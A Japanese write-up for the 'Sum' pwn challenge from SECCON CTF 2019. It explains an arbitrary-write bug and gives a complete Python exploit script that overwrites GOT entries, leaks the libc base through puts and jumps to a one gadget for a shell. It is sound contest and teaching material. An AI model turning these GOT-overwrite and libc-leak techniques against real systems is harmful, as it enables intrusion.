# [pwn 289pts] Sum - SECCON CTF 2019
64ビットバイナリで、PIEとRELRO以外は有効です。
```
$ checksec -f ./sum
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   72 Symbols     Yes      0               2       ./sum
```
総和が求められますが、総和を代入する変数のポインタも書き換えられるので自由なアドレスに総和を入れられます。ここで入力した数字がいい感じにスタックに残ってROPに使えるというのが想定解だったそうです。
私はまずexitのGOTをmainに向けました。そしてstdoutの下位1バイトを0x10だけずらし、setvbufをputsに向けます。`_start`にジャンプすることで`setvbuf(stdout+0x10, ...)`が呼ばれ、libc leakできます。あとはone gadgetに飛ばして終了です。
```python
from ptrlib import *
from time import sleep

def overwrite(target, value):
    sock.recvuntil("0\n")
    sock.sendline(str(-target))
    sock.sendline(str(2))
    sock.sendline(str(-1))
    sock.sendline(str(-1))
    sock.sendline(str(value))
    sock.sendline(str(target))
    return

elf = ELF("./sum")
libc = ELF("./libc.so")
#sock = Process("./sum")
sock = Socket("sum.chal.seccon.jp", 10001)
libc_one_gadget = 0x10a38c

# libc leak
overwrite(elf.got("exit"), elf.symbol("main"))
overwrite(elf.got("__stack_chk_fail"), elf.symbol("main"))
overwrite(elf.got("setvbuf"), elf.plt("puts"))
overwrite(0x601060 - 7, 0x7000000000000000)
overwrite(elf.got("exit"), elf.symbol("_start"))
libc_base = u64(sock.recvline()) - libc.symbol("_IO_2_1_stdout_") - 131
logger.info("libc base = " + hex(libc_base))

# one gadget!
overwrite(elf.got("exit"), libc_base + libc_one_gadget)

sock.interactive()
```

# 感想
いい感じの問題だと思います。（小並）
